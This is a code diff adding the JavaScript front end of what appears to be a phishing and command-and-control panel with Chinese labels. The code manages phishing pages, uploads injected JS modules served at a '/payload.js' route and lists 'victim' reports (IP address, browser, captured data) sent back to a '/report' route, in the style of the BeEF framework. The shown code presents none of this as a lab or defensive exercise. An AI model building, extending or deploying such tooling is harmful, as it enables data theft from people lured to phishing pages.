+async function phDeletePage(name) {
+    if (!confirm('删除页面 ' + name + '?')) return;
+    try {
+        var d = await phFetch('/api/phishing/page/' + encodeURIComponent(name), {method: 'DELETE'});
+        loadPhPages();
+    } catch (e) {}
+}
+
+// ── 模块增删 ──
+
+function phAddModule() {
+    var filename = prompt('新 JS 模块文件名(如 mymod.js):', '');
+    if (!filename) return;
+    filename = filename.trim();
+    if (!filename.endsWith('.js')) { alert('必须以 .js 结尾'); return; }
+    var content = prompt('模块内容(必须含 // MODULE = {...} 元数据头):',
+        '// MODULE = {"desc": "模块描述", "params": [["param1", "默认 xxx"]]}\n(function () {\n  report({type: "custom", url: location.href});\n})();');
+    if (content === null) return;
+    phSaveModule(filename, content);
+}
+
+async function phSaveModule(filename, content) {
+    try {
+        var d = await phFetch('/api/phishing/module/add', {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({filename: filename, content: content})
+        });
+        loadPhModules();
+    } catch (e) {}
+}
+
+async function phDeleteModule(name) {
+    if (!confirm('删除 JS 模块 ' + name + '.js?')) return;
+    try {
+        var d = await phFetch('/api/phishing/module/' + encodeURIComponent(name + '.js'), {method: 'DELETE'});
+        loadPhModules();
+    } catch (e) {}
+}
+
+// ── 受害记录 ──
+
+var phReportTimer = null;
+
+// UA 摘要(浏览器/OS 简析,BeEF 风格 victim 信息)
+function phUaSummary(ua) {
+    if (!ua) return '';
+    var s = '';
+    if (/Windows NT 10/.test(ua)) s = 'Win10';
+    else if (/Windows NT 6\.3/.test(ua)) s = 'Win8.1';
+    else if (/Windows/.test(ua)) s = 'Windows';
+    else if (/iPhone|iPad/.test(ua)) s = 'iOS';
+    else if (/Android/.test(ua)) s = 'Android';
+    else if (/Mac OS X/.test(ua)) s = 'macOS';
+    else if (/Linux/.test(ua)) s = 'Linux';
+    else s = 'Unknown';
+    if (/Edg\//.test(ua)) s += '·Edge';
+    else if (/Chrome\//.test(ua)) s += '·Chrome';
+    else if (/Firefox\//.test(ua)) s += '·Firefox';
+    else if (/Safari\//.test(ua)) s += '·Safari';
+    return s;
+}
+
+async function loadPhReports() {
+    try {
+        var d = await phFetch('/api/phishing/reports?limit=100');
+        var list = document.getElementById('ph-report-list');
+        if (!list) return;
+        var reports = d.reports || [];
+        var cnt = document.getElementById('ph-report-count');
+        if (cnt) cnt.textContent = '(' + reports.length + ')';
+        var scnt = document.getElementById('ph-reportcount');
+        if (scnt) scnt.textContent = reports.length;
+        if (!reports.length) {
+            list.innerHTML = '<p style="color:var(--text-muted);font-size:0.78rem;padding:8px;">暂无回传记录</p>';
+            return;
+        }
+        var html = '';
+        reports.forEach(function(r) {
+            var dataStr = '';
+            try {
+                var dj = JSON.parse(r.data || '{}');
+                var keys = Object.keys(dj).filter(function(k){ return k !== 'type' && k !== 'url'; });
+                dataStr = keys.slice(0, 4).map(function(k){ return k + '=' + String(dj[k]).slice(0, 60); }).join(' ');
+            } catch (e) { dataStr = String(r.data || '').slice(0, 200); }
+            html += '<div style="padding:7px 9px;margin:5px 0;border:1px solid var(--border);border-radius:8px;background:rgba(3,7,15,0.4);font-size:0.72rem;">';
+            html += '<div style="display:flex;gap:6px;align-items:center;">';
+            html += '<span class="badge-event" style="color:var(--danger);">' + escapeHtml(r.type || 'report') + '</span>';
+            html += '<span style="color:var(--text-muted);">' + escapeHtml(r.ip || '') + '</span>';
+            var uas = phUaSummary(r.ua || '');
+            if (uas) html += '<span style="color:var(--text-faint);font-size:0.68rem;">' + escapeHtml(uas) + '</span>';
+            html += '<span style="flex:1;"></span>';
+            html += '<span style="color:var(--text-faint);">' + escapeHtml(r.ts_iso || '') + '</span>';
+            html += '</div>';
+            if (r.url) html += '<div style="color:var(--accent);margin-top:3px;word-break:break-all;">' + escapeHtml(r.url) + '</div>';
+            if (dataStr) html += '<div style="color:var(--text-muted);margin-top:2px;word-break:break-all;">' + escapeHtml(dataStr) + '</div>';
+            html += '<details style="margin-top:3px;"><summary style="cursor:pointer;color:var(--text-faint);font-size:0.7rem;">完整数据</summary>';
+            html += '<pre style="white-space:pre-wrap;word-break:break-all;font-size:0.68rem;margin:4px 0 0;color:var(--text-muted);">' + escapeHtml(r.data || '') + '</pre></details>';
+            html += '</div>';
+        });
+        list.innerHTML = html;
+    } catch (e) {}
+}
+
+async function phClearReports() {
+    if (!confirm('清空全部受害回传记录?')) return;
+    try {
+        var d = await phFetch('/api/phishing/reports/clear', {method: 'POST'});
+        loadPhReports();
+    } catch (e) {}
+}
+
+// ── 配置 ──
+
+async function loadPhConfig() {
+    try {
+        var st = await phFetch('/api/phishing/status');
+        var box = document.getElementById('ph-config');
+        if (!box) return;
+        var cfg = st.config || {};
+        box.innerHTML = '';
+        var fields = [
+            {k: 'port', label: '监听端口', type: 'number', def: st.port || 9100},
+            {k: 'route_payload', label: 'JS 路由', type: 'text', def: st.route_payload || '/payload.js'},
+            {k: 'route_report', label: '回传路由', type: 'text', def: st.route_report || '/report'},
+            {k: 'default_module', label: '默认模块', type: 'text', def: st.default_module || 'hello'}
+        ];
+        fields.forEach(function(f, i) {
+            var row = document.createElement('div');
+            row.style.cssText = 'margin-bottom:8px;';
+            var lab = document.createElement('label');
+            lab.htmlFor = 'ph-cfg-' + i;
+            lab.textContent = f.label;
+            lab.style.cssText = 'display:block;font-size:0.76rem;color:var(--text-muted);margin-bottom:3px;';
+            var inp = document.createElement('input');
+            inp.id = 'ph-cfg-' + i;
+            inp.className = 'form-control';
+            inp.type = f.type;
+            inp.value = f.def;
+            inp.setAttribute('data-cfg', f.k);
+            inp.style.cssText = 'font-family:var(--font-mono);font-size:0.78rem;';
+            row.appendChild(lab);
+            row.appendChild(inp);
+            box.appendChild(row);
+        });
+        var btn = document.createElement('button');
+        btn.className = 'btn btn-sm btn-primary';
+        btn.textContent = '保存配置';
+        btn.onclick = phSaveConfig;
+        box.appendChild(btn);
+        var note = document.createElement('div');
+        note.style.cssText = 'font-size:0.7rem;color:var(--text-faint);margin-top:6px;';
+        note.textContent = '端口/路由变更需重启生效;default_module 即时生效';
+        box.appendChild(note);
+    } catch (e) {}
+}
+
+async function phSaveConfig() {
+    var updates = {};
+    document.querySelectorAll('#ph-config input[data-cfg]').forEach(function(inp) {
+        updates[inp.getAttribute('data-cfg')] = inp.value;
+    });
+    try {
+        var d = await phFetch('/api/phishing/config', {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify(updates)
+        });
+        alert(d.message || '已保存');
+        loadPhStatus();
+    } catch (e) {}
+}
+
+// ── 审计 ──
+
+async function openPhAuditModal() {
+    document.getElementById('ph-audit-modal').style.display = 'flex';
+    var box = document.getElementById('ph-audit-list');
+    box.innerHTML = '加载中...';
+    try {
+        var d = await phFetch('/api/phishing/audit');
+        var entries = d.audit || [];
+        if (!entries.length) { box.innerHTML = '<span style="color:var(--text-muted);">暂无操作日志</span>'; return; }
+        var html = '';
+        entries.forEach(function(e) {
+            html += '<div style="margin-bottom:8px;">[' + escapeHtml(e.ts_iso || '') + '] ' + escapeHtml(e.line || '') + (e.output_head ? ' → ' + escapeHtml(e.output_head) : '') + '</div>';
+        });
+        box.innerHTML = html;
+    } catch (e) { box.innerHTML = '加载失败'; }
+}
+
+function closePhAuditModal() {
+    document.getElementById('ph-audit-modal').style.display = 'none';
+}
+
+// ── 钓鱼页面轮询(切到该 tab 后每 3s) ──
+(function() {
+    var oldTab = document.querySelector('.cc-tab-link.active');
+    var current = oldTab ? oldTab.getAttribute('data-tab') : 'c2';
+    if (current === 'phishing') {
+        phTimer = setInterval(function() { loadPhReports(); loadPhStatus(); }, 3000);
+    }
+    var origClick = document.querySelectorAll('.cc-tab-link')[0];
+    document.querySelectorAll('.cc-tab-link').forEach(function(link) {
+        link.addEventListener('click', function() {
+            var t = this.getAttribute('data-tab');
+            if (phTimer) { clearInterval(phTimer); phTimer = null; }
+            if (t === 'phishing') {
+                phTimer = setInterval(function() { loadPhReports(); loadPhStatus(); }, 3000);
+            }
+        });
+    });
+})();
 </script>
 {% endblock %}
